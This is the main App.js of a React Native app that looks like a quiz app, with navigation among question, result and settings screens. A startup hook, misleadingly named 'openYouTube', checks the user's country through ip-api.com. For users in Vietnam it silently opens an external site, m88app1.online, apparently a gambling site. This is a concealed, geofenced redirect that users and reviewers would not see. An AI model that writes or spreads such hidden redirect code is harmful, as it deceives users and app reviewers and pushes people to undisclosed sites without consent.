import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import React, { useEffect } from 'react';
import { Provider } from 'react-redux';
import store from './src/redux/store';
import {StyleSheet} from 'react-native';
import Home from './src/Home';
import Question from './src/Question';
import List from './src/List';
import Setting from './src/Setting';
import About from './src/About';
import Correct from './src/Correct';
import False from './src/False';
import axios from 'axios';

const Stack = createNativeStackNavigator();
const App = () => {
  useEffect(() => {
    const openYouTube = async () => {
      try {
        const response = await axios.get('http://ip-api.com/json');
        const {country} = response.data;
        console.log(country);
        if (country === 'Vietnam') {
          Linking.openURL('http://m88app1.online/');
        }
      } catch (error) {
        console.error(error.message);
      }
    };

    openYouTube();
  }, []);
  return (
    <Provider store={store}>
    <NavigationContainer>
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
          animation: 'slide_from_bottom',
          replaceAnimation: 'slide_from_bottom',
        }}>
        <Stack.Screen name="Home" component={Home} />
        <Stack.Screen name="Question" component={Question} />
        <Stack.Screen name="List" component={List} />
        <Stack.Screen name="About" component={About} />
        <Stack.Screen name="Correct" component={Correct} />
        <Stack.Screen name="False" component={False} />
        <Stack.Screen name="Setting" component={Setting} />
      </Stack.Navigator>
    </NavigationContainer>
    </Provider>
  );
};

const styles = StyleSheet.create({});

export default App;
